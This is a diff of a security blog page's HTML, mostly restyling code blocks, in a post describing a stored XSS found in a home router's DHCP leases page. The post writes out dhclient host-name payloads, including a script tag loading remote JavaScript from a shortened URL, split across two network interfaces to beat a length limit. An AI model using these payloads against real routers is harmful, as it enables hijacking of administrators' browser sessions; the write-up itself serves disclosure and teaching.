@@ -41,7 +41,7 @@
         </header>
 
 <!--         <header class="post-header">
-            <a id="blog-logo" href="https://mthbernardes.github.io">
+            <a id="blog-logo" href="http://localhost:4000">
                 
                     <span class="blog-title">Gambler</span>
                 
@@ -65,35 +65,35 @@
 
 <p>The first thing I tried on that was an command injection on ping function. It didn’t work, but gave the output of what a sent, so I realized that was a lot of XSS possibilities on this router. The first place I tried, was on ping function again, but there was some control that did not allow me to sent especial characters, beyond that, it’s not a good place to get a XSS, I needed a XSS stored on this precious router, and then a divine light open my mind, and made me test the first page of the router, where they show the DHCP leases. This page contains host name, ip address and mac address of each host so I thought maybe I could manipulate the host name of my host and sent a malicious data. In a simple Google search, I realized that I just need to change one line on dhclient config file (/etc/dhcp/dhclient.conf)</p>
 
-<pre><code class="language-bash">send host-name = "&lt;script&gt;alert('HACKED')&lt;/script&gt;";
-</code></pre>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>send host-name <span class="o">=</span> <span class="s2">"&lt;script&gt;alert('HACKED')&lt;/script&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
 
 <p>Sadly it didn’t work. I opened the html source and saw that the last character wasn’t there so I figured out that there was a limit on the host name size only 31 characters. Just to validate the XSS, I removed the HACKED string to force the lease and it works and then my saga started to get something more interesting then a alert().</p>
 
 <p>I created a payload.js and hosted it on a VPS and tried a lot of techniques to make the content of this file executed by the browser, but none of then worked. I got close using the site <a href="https://l.ly">l.ly</a> to short my url, but due the “XXX” character, it didn’t work.</p>
 
-<pre><code class="language-bash">send host-name = "&lt;script src=//l.ly/uXa&gt;&lt;/script&gt;";
-</code></pre>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>send host-name <span class="o">=</span> <span class="s2">"&lt;script src=//l.ly/uXa&gt;&lt;/script&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
 
 <p>So I thought in buying a short domain like l.ly and host my payload file named as 1 and my problem would be resolved, but it’s extremely expensive and I don’t have money to do that. After hours thinking the best way to do that, I realized how stupid I am: the only thing I needed, is just another network interface, to create this output on the router.</p>
 
-<pre><code class="language-html">&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;&lt;script src=//l.ly/uXa&gt;&lt;!--&lt;/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/td&gt;&lt;td&gt;192.168.0.44&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;--&gt;&lt;/script&gt;&lt;/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/td&gt;&lt;td&gt;192.168.0.44&lt;/td&gt;&lt;/tr&gt;
-</code></pre>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;tr&gt;&lt;td&gt;</span>10<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;script </span><span class="na">src=</span><span class="s">//l.ly/uXa</span><span class="nt">&gt;</span><span class="o">&lt;!--&lt;</span><span class="sr">/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">td</span><span class="o">&gt;</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">0.44</span><span class="o">&lt;</span><span class="sr">/td&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span><span class="o">&gt;</span><span class="mi">10</span><span class="o">&lt;</span><span class="sr">/td&gt;&lt;td&gt;--&gt;</span><span class="nt">&lt;/script&gt;&lt;/td&gt;&lt;td&gt;</span>f4:96:34:25:65:c5<span class="nt">&lt;/td&gt;&lt;td&gt;</span>192.168.0.44<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+</code></pre></div></div>
 
 <p>I just splitted the payload on my 2 interfaces, the first interface receives the follow payload,</p>
 
-<pre><code class="language-bash">send host-name = "&lt;script src=//l.ly/uXa&gt;&lt;!--";
-</code></pre>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>send host-name <span class="o">=</span> <span class="s2">"&lt;script src=//l.ly/uXa&gt;&lt;!--"</span><span class="p">;</span>
+</code></pre></div></div>
 
 <p>Where I have the start of the payload, and a HTML comment, to ignore everything after my tag script, and the second payload,</p>
 
-<pre><code class="language-bash">send host-name = "--&gt;&lt;/script&gt;";
-</code></pre>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>send host-name <span class="o">=</span> <span class="s2">"--&gt;&lt;/script&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
 <p>I just closed the comment, and inserted the end of the tag script, I forced the interfaces to lease the ip address and request again, and then I finally got my XSS payload been executed.</p>
 
-<pre><code class="language-bash">dhclient -r &amp;&amp; dhclient
-</code></pre>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dhclient <span class="nt">-r</span> <span class="o">&amp;&amp;</span> dhclient
+</code></pre></div></div>
 
 <p><img src="/assets/images/router-hacked.png" alt="hacked" title="hacked" /></p>
 
@@ -140,7 +140,7 @@
                     <h4> Matheus Bernardes </h4>
                     <!-- Author Bio -->
                     <p>
-                        Security consultant, Python programmer, CTF <a href="https://rtfm-ctf.org" target="_blank">RTFM</a> team player and an enthusiast (noob) in reverse engineering.
+                        Just another security engineer.
                     </p>
                 </section>
             
@@ -192,7 +192,6 @@
       <section class="copyright">
         <a href="/">Gambler</a> &copy;
               2018 &bull; All rights reserved.
-              <script src="https://www.hackthebox.eu/badge/7591"></script>
       </section>
       <section class="poweredby">Made with Jekyll using
         <a href="http://github.com/rosario/kasper">Kasper theme</a>
